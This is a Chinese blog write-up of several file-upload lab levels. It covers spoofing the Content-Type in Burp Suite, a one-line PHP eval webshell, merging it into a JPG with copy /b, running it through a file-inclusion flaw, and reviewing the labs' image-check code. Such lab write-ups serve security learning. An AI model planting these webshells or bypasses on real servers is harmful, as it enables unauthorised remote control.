<td align="center">PNG图像</td>
<td align="center">.png</td>
<td align="center">image/png</td>
</tr>
<tr>
<td align="center">GIF图形</td>
<td align="center">.gif</td>
<td align="center">image/gif</td>
</tr>
<tr>
<td align="center">JPEG图形</td>
<td align="center">.jpeg,.jpg</td>
<td align="center">image/jpeg</td>
</tr>
</tbody></table>
<p>看到是在服务器端进行判断就应该知道像上道题目中, 使用浏览器的手段应该是行不通的了, 要想办法骗过服务器. 在这里, 我们使用工具<code>Burp Suite</code>对需要上传的数据包进行修改.<br>具体步骤:<br>因为截图比较麻烦, 我就不放图了, 有需要可以自行百度.</p>
<ol>
<li>打开<code>Burp Suite</code>默认代理端口<code>127.0.0.1:8080</code>，<code>intercept</code>标签中开启数据拦截功能 intercept is on。</li>
<li>上传<code>test.php</code>的文件，提示文件类型不正确，请重新上传。</li>
<li>打开<code>Burp Suite</code>默认代理端口<code>127.0.0.1:8080</code>，<code>intercept</code>标签中开启数据拦截功能intercept is on。</li>
<li>chrome浏览器代理设置，<code>127.0.0.1:8080</code>,这里我使用的是<code>SwitchyOmega</code>插件进行快速设置。</li>
<li>重新选择<code>test.php</code>文件进行上传，<code>Burp Suite</code>拦截到文件上传数据包。(如果在本地部署靶场, <code>Burp Suite</code>可能会拦截不到数据包?)</li>
<li>将拦截数据包中的<code>content-type:application/octet-stream</code>更改为<code>content-type:image/jpeg</code>，点击<code>forward</code>转发。</li>
<li>查看上传网页界面，发现文件已经上传成功。</li>
</ol>
<h3 id="pass13"><a href="#pass13" class="headerlink" title="pass13:"></a>pass13:</h3><p>题目要求：</p>
<blockquote>
<p>上传图片马到服务器。<br>注意：<br>1.保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码。<br>2.使用<code>文件包含漏洞</code>能运行图片马中的恶意代码。<br>3.图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！</p>
</blockquote>
<p>好的，什么是<code>图片马</code>？<br>百度了下相关的概念和制作方法，其实说白了，图片马就是在图片文件中入恶意代码，但依然保持文件类型是图片格式（<code>.jpg</code>,<code>.png</code>,<code>.gif</code>等）的木马文件。<br>最简单的图片马当然就是在图片中插入<code>一句话</code>生成的,</p>
<p>制作方法很简单, 随便找个图片( 以<code>jpg</code>为例 ), 以记事本打开, 在末尾加上<code>一句话</code>的代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>并保存下来就制作好了. ( 在某篇博客中看到, 可以只保留原文件的前三行然后再加入代码, 因为有时图片过大会影响图片马的运行. )<br>也可以用cmd, 输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy  1.jpg/b+2.php/a  3.jpg</span><br></pre></td></tr></table></figure>

<p><code>1.jpg</code> 是原图片文件, <code>2.php</code>是<code>一句话</code>, <code>3.jpg</code>就是两个文件合并后的新文件.<br><code>/b</code>是以二进制形式,适用于图片音频等文件<br><code>/a</code>是ascii形式,适用于<code>txt</code>,<code>php</code>等文本文件<br><font size="2" color="green">小声bb : 然而亲测好像没有什么区别</font></p>
<p>把合成好的文件放到测试的目录下, 尝试使用菜刀连接. </p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/jpg.png" alt title class>
                <p></p>
            </figure>
<p>.<br>.<br>.<br>会发现连接不上 :|</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/error.png" alt title class>
                <p></p>
            </figure>
<p>这是因为菜刀只能和<code>php</code>,<code>asp</code>,<code>aspx</code>等脚本文件连接. </p>
<p>如果把后缀改成<code>php</code>,再次连接…</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/php.png" alt title class>
                <p></p>
            </figure>

<p>可以发现正常工作. :)<br>但是这不足以解决这个题目.<br>因为题目只能提交<code>.jpg</code>等图片文件, 所以要用题目中的<code>文件包含漏洞</code>.<br>看下题目中提供的<code>include.php</code>的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>); </span><br><span class="line">$file = $_GET[<span class="string">'file'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123; </span><br><span class="line">    <span class="keyword">include</span> $file; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__file__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>感觉<code>GET()</code>函数应该是关键点<br>百度了下, <code>GET()</code>函数在这的使用方法是在URL处获取参数.<br>比如, 我在URL<code>http://某路径/include.php</code>后加上<code>?file=test.txt</code>, 也就是<code>http://某路径/include.php?file=test.txt</code>那么当我访问这个URL时, 脚本就会自动找到<code>test.txt</code>并把其内容放到当前<code>include.php</code>中一起执行.<br>这样,我们就可以通过<code>文件包含漏洞</code>, 使服务器在运行<code>include.php</code>时把我们的木马一起运行了.</p>
<p>在浏览器中测试下,</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/ceshi.png" alt title class>
                <p></p>
            </figure>
<p>可以发现, <code>图片马</code>的数据已经被访问到了.(但是没有发现<code>php脚本</code>回显, 暂时存疑 :/ )</p>
<p>在使用菜刀尝试连接</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/sucessful.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/C.png" alt title class>
                <p></p>
            </figure>
<p>成功拿到了 <code>webshell</code>,这道题到这就算是结束了, 其它的两个图片类型应该也都差不多, 这里不多赘述. :)</p>
<h4 id="顺便提一下"><a href="#顺便提一下" class="headerlink" title="顺便提一下"></a>顺便提一下</h4><p>每次用<code>一句话</code>或者用大马得到<code>webshell</code>后, 目录下就会发现有<code>$RECYCLE.BIN</code>和system volume information这俩个文件夹. 在这里贴下相关资料:<br><a href="https://blog.csdn.net/sinat_33718563/article/details/78837510" target="_blank" rel="noopener">rs勿忘初心</a>:</p>
<blockquote>
<p><code>$RECYCLE.BIN</code> :首先说明这是系统文件 不是病毒<code>$RECYCLE.BIN</code> 不是像一个回收站，它就是回收站！每个盘都有！你在每个盘删除的东西都会留在各自盘的回收站（即 <code>$RECYCLE.BIN</code>）里，而桌面上的就是总的回收站了。各自盘里的<code>$RECYCLE.BIN</code> 再你清空桌面上的回收站后也就自动清除了！</p>
</blockquote>
<p><a href>tangpeicheng</a>:</p>
<blockquote>
<p>system volume information:<br>其中文名称可以翻译为“系统卷标信息”。这个文件夹里就存储着系统还原的备份信息。这里涉及到“系统还原”,“系统还原”是Windows XP最实用的功能之一，它采用“快照”的方式记录下系统在特定时间的状态信息，也就是所谓的“还原点”，然后在需要的时候根据这些信息加以还原。</p>
</blockquote>
<h3 id="pass14"><a href="#pass14" class="headerlink" title="pass14:"></a>pass14:</h3><p>同pass13</p>
<h3 id="pass15"><a href="#pass15" class="headerlink" title="pass15:"></a>pass15:</h3><p>同pass14<br>虽然13，14，15可以用同样的方法过关.<br>但是我们不妨仔细的分析下代码, 体会区别</p>
<h4 id="pass14代码"><a href="#pass14代码" class="headerlink" title="pass14代码:"></a>pass14代码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这里先是定义了一个函数<br><code>isImage($filename)</code><br>这个函数的作用可以推测是判断文件是否为图片类型，如果是则返回具体类型(.jpg,.png,.git)，如果不是则返回 false. </p>
<p>这其中还有两个函数<code>getimagesize()</code>和<code>image_type_to_extension()</code><br>其中<code>getimagesize()</code>会以数组的形式返回图像的一组信息, 其第二个元素(<code>info[2]</code>)保存的是图片类型. 但是是以数字编码的形式(1,2,3…)保存, 所以需要使用<code>image_type_to_extension($info[2])</code>将数字转为字符串.</p>
<p>程序主体这里出现了几个php脚本预定义的常量</p>
<ul>
<li><code>$_POST</code>可以用来收集来自<code>method = &quot;post&quot;</code>的表单的数据. 表单域的名称会自动成为 <code>$_POST</code> 数组中的键. 所以这里的 <code>&#39;submit&#39;</code>应该是某个表单域的名称.<br>事实上, 通过在浏览器中使用开发者工具分析网页中表单代码:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请选择要上传的图片：<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这应该就是上述的表单, 用来收集上传文件的数据. 而服务器接受到表单的数据后会自动将其中的信息保存在<code>$_POST</code>数组中供脚本调用. </p>
<ul>
<li><p><code>$_FILES</code>POST产生的表单存储在 <code>$_POST</code>中,那么上传的文件的相关信息保存在<code>$_FILES</code>中.<br>其有两个下标.第一个是文件的<code>name</code>, 此处即为表单中的<code>upload_file</code>.第二个则是文件的某些具体参数可以是:”name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p>
<ul>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;name&quot;]</code> - 被上传文件的名称</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;type&quot;]</code> - 被上传文件的类型</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;size&quot;]</code> - 被上传文件的大小，以字节计</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;tmp_name&quot;]</code> - 存储在服务器的文件的临时副本的名称</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;error&quot;]</code>- 由文件上传导致的错误代码<h4 id="pass15代码"><a href="#pass15代码" class="headerlink" title="pass15代码:"></a>pass15代码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>其他部分大同小异,主要是<code>exif_imagetype(&amp;filename)</code>函数</p>
<blockquote>
<p>本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 <code>$_SERVER[&#39;HTTP_ACCEPT&#39;]</code> 结合使用来检查浏览器是否可以显示某个指定的图像。</p>
</blockquote>
<p>所以只是对第一个字节进行检测, 用pass13的方法即可绕过.</p>
]]></content>
      
        
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> php </tag>
            
            <tag> 一句话木马 </tag>
            
            <tag> 图片马 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
